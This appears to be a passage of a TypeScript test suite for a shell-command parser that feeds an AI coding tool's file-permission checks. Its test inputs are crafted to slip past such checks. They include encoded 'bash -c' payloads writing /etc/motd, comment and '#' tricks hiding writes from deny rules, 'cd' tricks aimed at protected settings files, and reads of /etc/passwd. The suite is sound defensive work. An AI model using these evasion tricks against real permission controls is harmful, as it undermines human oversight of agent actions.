      'marks writes after popd with expansion args as cwd-unknown',
      "popd $DIR && printf '{}' > settings.local.json",
      [uncertainWrite('/repo/settings.local.json')],
    ],
    // Keep the guessed path, but mark it unsafe to trust as final.
    [
      'marks relative writes after dynamic `cd` targets as cwd-unknown',
      'cd $TARGET && echo hi > out.txt',
      [uncertainWrite('/repo/out.txt')],
    ],
    [
      'marks all file ops after dynamic `cd` as cwd-unknown',
      'cd "$QWEN_HOME" && echo hi > ../settings.json',
      [uncertainWrite('/settings.json')],
    ],
    [
      'clears cwd-unknown after an absolute static `cd`',
      'cd $TARGET && cd /repo/.qwen && echo hi > settings.json',
      [write(REPO_SETTINGS)],
    ],
    [
      'preserves operation order across compound segments',
      'echo a > one.txt && cd sub && echo b > two.txt; cat /etc/hosts',
      [write('/repo/one.txt'), write('/repo/sub/two.txt'), read('/etc/hosts')],
    ],
    [
      'returns no ops when only `cd` segments are present',
      'cd .qwen && cd ..',
      [],
    ],
  ])('%s', (_title, command, expected) => {
    expect(across(command)).toEqual(expected);
  });

  // A backgrounded `cd` runs in a subshell, so the parent's cwd is untouched
  // and the next segment's relative write lands in the *original* directory —
  // which is exactly where a protected settings file lives. Attributing the
  // write to the `cd` target instead would check the wrong path.
  it.each([
    ['cd /tmp & echo {} > settings.json'],
    ['cd .qwen & echo {} > settings.json'],
  ])('does not move the cwd for the backgrounded `cd` in %s', (command) => {
    expect(across(command)).toEqual([write('/repo/settings.json')]);
  });

  it.each(['pushd', 'pushd +2', 'pushd -2', 'pushd -n /tmp'])(
    'marks writes after `%s` as cwd-unknown',
    (command) => {
      expect(across(`${command} && printf '{}' > settings.local.json`)).toEqual(
        [uncertainWrite('/repo/settings.local.json')],
      );
    },
  );

  it('does not mark absolute writes after dynamic `cd` as cwd-dependent', () => {
    for (const command of [
      'cd "$QWEN_HOME" && echo hi > /tmp/out.txt',
      'cd "$QWEN_HOME" && echo hi 1>/tmp/out.txt',
      'cd "$QWEN_HOME" && echo hi >&/tmp/out.txt',
      'cd "$QWEN_HOME" && echo hi 1>&/tmp/out.txt',
    ]) {
      expect(across(command)).toEqual([uncertainWrite('/tmp/out.txt', false)]);
    }
    expect(across('cd "$QWEN_HOME" && cat <&/tmp/in.txt')).toEqual([
      {
        virtualTool: 'read_file',
        filePath: '/tmp/in.txt',
        cwdUnknown: true,
        pathMayDependOnCwd: false,
      },
    ]);
    // A quoted `&` is part of a relative name: `&/tmp/out.txt` in the cwd.
    expect(across('cd "$QWEN_HOME" && echo hi >"&"/tmp/out.txt')).toEqual([
      uncertainWrite('/repo/&/tmp/out.txt'),
    ]);
  });

  it('falls back gracefully on excessively deep wrapper nesting', () => {
    // A pathological chain hits MAX_SHELL_UNWRAP_DEPTH (4) and the remainder
    // is analysed as-is instead of recursing forever. The result does not
    // matter, only that the call returns without throwing or hanging.
    const deep = 'bash -lc "bash -lc \\"bash -lc \'bash -lc echo > x.txt\'\\""';
    expect(() => across(deep)).not.toThrow();
  });
});

describe('line continuations before a `$` construct', () => {
  it('reads the ANSI-C word the continuation interrupts', () => {
    // The shell removes `\`+newline before it lexes, so the ANSI-C opener it
    // interrupts is the word bash runs; `$` + continuation + `'` is not a
    // dangling `$` followed by an unrelated quoted word.
    const literal = ops("mv /tmp/a $'/tmp/protected/x'");
    expect(literal).not.toEqual([]);
    expect(ops("mv /tmp/a $\\\n'/tmp/protected/x'")).toEqual(literal);
  });
});

describe('ANSI-C words ending in a literal trailing \\c', () => {
  it('keeps the redirect visible after the word', () => {
    expect(
      extractShellOperationsAcrossCommand("echo $'a\\c' > /etc/motd", '/repo'),
    ).toEqual([write('/etc/motd')]);
  });

  it('keeps later operands visible after the word', () => {
    const ops = extractShellOperationsAcrossCommand(
      "cat $'x\\c' /etc/passwd",
      '/tmp',
    );
    expect(ops.map((op) => op.filePath)).toContain('/etc/passwd');
  });
});

// A multi-unit ANSI-C escape appends one `bare` entry per UTF-16 unit of its
// decoded text, so positional syntax trimming stays aligned and the unquoted
// `)` after an astral filename is dropped, not kept in the path.
describe('ANSI-C astral escape keeps bare aligned with current', () => {
  it('trims the closing paren after a multi-unit escape', () => {
    expect(
      extractShellOperationsAcrossCommand("(cat > $'\\U0001F600')", '/repo'),
    ).toEqual([write('/repo/😀')]);
  });

  it('still trims after a single-unit escape', () => {
    expect(
      extractShellOperationsAcrossCommand("(cat > $'\\x41')", '/repo'),
    ).toEqual([write('/repo/A')]);
  });
});

// Invalid UTF-8 keeps one lone surrogate per byte: two different byte paths
// must never collapse into the same string.
describe('ANSI-C bytes that are not valid UTF-8', () => {
  it.each<[command: string, path: string]>([
    [String.raw`cat $'\xff'`, '/repo/\udcff'],
    [String.raw`cat $'\xc3'`, '/repo/\udcc3'],
    [String.raw`cat $'\uD800'`, '/repo/\udced\udca0\udc80'],
    [String.raw`cat $'\U00110000'`, '/repo/\udcf4\udc90\udc80\udc80'],
  ])('keeps one character per byte: %s', (command, path) => {
    expect(extractShellOperationsAcrossCommand(command, '/repo')).toEqual([
      read(path),
    ]);
  });
});

describe('unprovable boundary fail-closed (B4)', () => {
  it.each([
    // An ANSI-C delimiter (`<<$'EOF'`) is decoded by bash; this lexer kept it as
    // `$EOF`, never matched the terminator and swallowed the rest of the script.
    ['an ANSI-C heredoc delimiter', "cat <<$'EOF'\nbody\necho hi > out.txt"],
    // CR/VT/FF are word boundaries to the character class but not modeled by
    // the ambiguity check, so the `#` truncated the line.
    ['a CR before the hash', 'echo a\r#x > out.txt'],
    ['an escaped semicolon before the hash', 'echo a\\;#x > out.txt'],
    // A `)` with no matching opener: the scan cannot tell word data from a
    // comment, so it must keep the text.
    ['an unmatched closing paren', 'echo hi)#x > out.txt'],
    // The lexer does not model backticks, so a `#` inside one truncated the
    // rest of the line.
    ['a hash inside backticks', 'echo `a # b`; echo hi > out.txt'],
  ])('keeps the write after %s', (_title, command) => {
    expect(across(command)).toContainEqual(
      expect.objectContaining({
        virtualTool: 'write_file',
        filePath: '/repo/out.txt',
      }),
    );
  });
});

describe('comment word boundaries', () => {
  it.each([
    ['an arithmetic close', 'echo $((1))#x > out.txt'],
    ['a process-substitution close', 'cat <(echo hi)#x > out.txt'],
    ['a continued word', 'printf hi\\\n#x > out.txt'],
  ])('keeps the write after %s visible', (_title, command) => {
    // B3: hiding the write here bypasses a `Write(./out.txt)` deny, so the
    // operation must stay in the extracted set.
    expect(across(command)).toContainEqual(
      expect.objectContaining({
        virtualTool: 'write_file',
        filePath: '/repo/out.txt',
      }),
    );
  });

  it('drops a write inside a proven comment', () => {
    expect(across('echo hi #x > out.txt')).toEqual([]);
  });
});

describe('ANSI-C wrapper payloads', () => {
  it.each([
    [String.raw`cat $'\xc3\xa9'`, [read('/repo/é')]],
    [String.raw`cat $'\xc3'$'\xa9'`, [read('/repo/é')]],
    [String.raw`cat $'a\c\\tb'`, [read('/repo/a\x1ctb')]],
    [String.raw`cat $'\c?'`, [read('/repo/\x7f')]],
    [String.raw`cat $'\x3e'/etc/passwd`, [read('/repo/>/etc/passwd')]],
    ['echo hi ">"/tmp/x', []],
    ["echo hi >'>'x/../settings.json", [write('/repo/settings.json')]],
  ] as const)(
    'keeps decoded bytes and operators distinct: %s',
    (command, expected) => {
      expect(across(command)).toEqual(expected);
    },
  );

  it.each(["cd $''", "cd ''"])(
    'keeps an empty cd argument uncertain: %s',
    (command) => {
      expect(across(`${command}; cat > settings.json`)).toEqual([
        uncertainWrite('/repo/settings.json'),
      ]);
    },
  );
  it('keeps a redirect after a continuation-split PID visible', () => {
    expect(across("cat $\\\n$'a\\' > /etc/motd")).toContainEqual(
      write('/etc/motd'),
    );
  });

  // The script word is the word the shell resolves: an ANSI-C, locale or
  // continuation-split payload carries the operations that run, so the write
  // inside it must reach the permission scan.
  it.each([
    ['an ANSI-C payload', "bash -c $'cat > /etc/motd'"],
    ['a locale payload', 'sh -c $"cat > /etc/motd"'],
    [
      'a continuation-split payload',
      String.raw`sh -c $\
'cat > /etc/motd'`,
    ],
    [
      'a terminator after a continuation',
      String.raw`sh -c $\
'--' 'cat > /etc/motd'`,
    ],
    ['a brace-expanded terminator', "sh -c {--,'cat > /etc/motd'}"],
  ])('extracts the write inside %s', (_what, command) => {
    expect(across(command)).toEqual([write('/etc/motd')]);
  });

  it('treats a decoded operator as data, not a redirect', () => {
    // `$'\x3e'` decodes to `>` and is a `>` argument to `cat`: the read of
    // the file named `>` plus the real write, not a phantom write to `>`.
    expect(sorted(across(String.raw`cat $'\x3e' > /tmp/t`))).toEqual([
      read('/repo/>'),
      write('/tmp/t'),
    ]);
  });
});

describe('quoted and decoded tilde targets', () => {
  // bash expands `~` only when it was typed unquoted. `cat > "~/x"` and
  // `cat > $'\x7e/x'` both decode to `~/x` and write under a literal directory
  // named `~`, so expanding them invented a path under $HOME that no rule can
  // match (#16075 review, R2-8).
  it.each([
    ['a quoted tilde', 'cat > "~/x"'],
    ['an empty quote before the tilde', 'cat > ""~/x'],
    ['an empty quote in the tilde prefix', 'cat > ~""/x'],
    ['a single-quoted tilde', "cat > '~/x'"],
    ['a backslash-escaped tilde', String.raw`cat > \~/x`],
  ])('does not expand %s in a redirect target', (_what, command) => {
    expect(across(command)).toEqual([write('/repo/~/x')]);
  });

  it('does not expand a decoded tilde', () => {
    expect(across(String.raw`cat > $'\x7e/x'`)).toEqual([write('/repo/~/x')]);
  });

  it('still expands an unquoted tilde', () => {
    const home = os.homedir().replace(/\\/g, '/');
    expect(across('cat > ~/x')).toEqual([write(`${home}/x`)]);
  });

  it('keeps a decoded cd target uncertain', () => {
    // `cd $'\x7e'` is the literal `~` directory and may not exist at all, so
    // the rest of the segment runs in a cwd the analysis cannot know.
    expect(across(String.raw`cd $'\x7e' ; cat > settings.json`)).toEqual([
      uncertainWrite('/repo/~/settings.json'),
    ]);
  });

  it.each([String.raw`$'\x7e'/x`, '"~"/x', String.raw`\~/x`])(
    'keeps a literal tilde prefix uncertain: %s',
    (target) => {
      expect(across(`cd ${target}; cat > settings.json`)).toEqual([
        uncertainWrite('/repo/~/x/settings.json'),
      ]);
    },
  );

  it('keeps an empty quote in a cd tilde prefix uncertain', () => {
    expect(across("cd ~''; cat > settings.json")).toEqual([
      uncertainWrite('/repo/~/settings.json'),
    ]);
  });

  it('keeps a quoted cd target uncertain', () => {
    expect(across('cd "~/x" ; cat > y')).toEqual([
      uncertainWrite('/repo/~/x/y'),
    ]);
  });
});

// `>|` is a clobber-override redirect that writes its target exactly like `>`,
// and `<<<` feeds a here-string to stdin, so its operand is never a file. When
// either reading is lost the operand becomes a file path (`/repo/|`) or a
// phantom read, and permission rules match the wrong target.
describe('clobber-override and here-string redirects', () => {
  it('writes the target of a separate-token clobber override', () => {
    expect(across("echo '{}' >| x/settings.json")).toEqual([
      write('/repo/x/settings.json'),
    ]);
  });

  it('keeps /dev/null as the clobber-override target', () => {
    expect(across('git >| /dev/null commit --amend')).toEqual([
      write('/dev/null'),
    ]);
  });

  it('writes the target of a stderr clobber override', () => {
    expect(across('cmd 2>| out.log')).toEqual([write('/repo/out.log')]);
  });

  it('treats a here-string operand as stdin, never a file', () => {
    expect(across('cat <<< /etc/passwd')).toEqual([]);
    expect(across('cat <<<file')).toEqual([]);
  });

  it('still reports a write that follows a here-string', () => {
    expect(across("cat <<< '{}' > .qwen/settings.json")).toEqual([
      write('/repo/.qwen/settings.json'),
    ]);
  });
});
